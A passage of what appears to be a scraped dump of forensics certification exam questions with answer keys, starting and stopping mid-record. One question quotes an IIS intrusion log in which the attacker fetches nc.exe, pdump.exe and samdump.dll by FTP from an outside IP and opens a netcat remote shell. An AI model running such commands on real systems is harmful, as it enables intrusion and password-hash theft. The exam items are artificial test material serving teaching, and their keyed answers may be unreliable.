Snort reported Unicode attacks from 213.116.251.162. The File Permission\nCanonicalization vulnerability (UNICODE attack) allows scripts to be run in arbitrary folders that do not normally have the right to run scripts. The attacker tries a\nUnicode attack and eventually succeeds in displaying boot.ini.\nHe then switches to playing with RDS, via msadcs.dll. The RDS vulnerability allows a malicious user to construct SQL statements that will execute shell commands (such as CMD.EXE) on the IIS server. He does a quick query to discover that the directory exists, and a query to msadcs.dll shows that it is functioning correctly. The attacker makes a RDS query which results in the commands run as shown below.\n\"cmd1.exe /c open 213.116.251.162 >ftpcom\"\n\"cmd1.exe /c echo johna2k >>ftpcom\"\n\"cmd1.exe /c echo haxedj00 >>ftpcom\"\n\"cmd1.exe /c echo get nc.exe >>ftpcom\"\n\"cmd1.exe /c echo get pdump.exe >>ftpcom\"\n\"cmd1.exe /c echo get samdump.dll >>ftpcom\"\n\"cmd1.exe /c echo quit >>ftpcom\"\n\"cmd1.exe /c ftp -s:ftpcom\"\n\"cmd1.exe /c nc -l -p 6969 -e cmd1.exe\"\nWhat can you infer from the exploit given?","answer_images":[],"answer_description":"The log clearly indicates that this is a remote exploit with three files being downloaded and hence the correct answer is C.","unix_timestamp":1640723820,"timestamp":"2021-12-28 21:37:00"},{"id":"rImbcmb5IneuYUCZH4up","answer_description":"","question_id":92,"question_images":[],"isMC":true,"unix_timestamp":1605142320,"exam_id":175,"answer_ET":"C","answer_images":[],"topic":"1","choices":{"D":"Dependency Walker","B":"RegScanner","C":"RAM Capturer","A":"PEBrowse Professional"},"answer":"C","timestamp":"2020-11-12 01:52:00","question_text":"Which tool does the investigator use to extract artifacts left by Google Drive on the system?","discussion":[{"content":"Selected Answer: C\nRAM Capture is a live data acquisition.
